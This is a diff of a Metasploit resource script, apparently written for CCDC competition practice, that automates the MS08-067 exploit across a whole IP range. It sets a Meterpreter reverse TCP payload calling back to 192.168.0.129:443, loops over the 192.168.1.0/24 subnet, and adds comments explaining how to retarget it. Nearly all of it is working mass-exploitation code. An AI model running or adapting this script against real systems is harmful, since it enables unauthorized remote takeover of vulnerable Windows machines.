@@ -1,6 +1,7 @@
 # Christopher Truncer CCDC Practice 1/25/2013
-# 08_067 autopwn
+# 08_067 Autopwn - Purpose of this script is to quickly spam multiple IPs very quickly with 08_067
 # Modified similar script from from @mubix - awesome dude, very smart guy, check out his blog
+
 
 # Let's pick our payload
 
@@ -9,6 +10,7 @@ setg PAYLOAD windows/meterpreter/reverse_tcp
 
 
 # Set the IP range and port globally
+# Obviously, modify the LHOST value and LPORT if you wish
 
 setg LHOST 192.168.0.129
 setg LPORT 443
@@ -23,10 +25,11 @@ set DisablePayloadHandler true
 
 
 # Let's setup our targets
+# Modify the RHOSTS value for a single IP or CIDR notation of your targets
 
 <ruby>
 require 'rex/socket/range_walker'
-rhosts = "/root/ccdc/iprange.txt"
+rhosts = "192.168.1.0/24"
 iplist = Rex::Socket::RangeWalker.new(rhosts)
 iplist.each do |rhost|
 
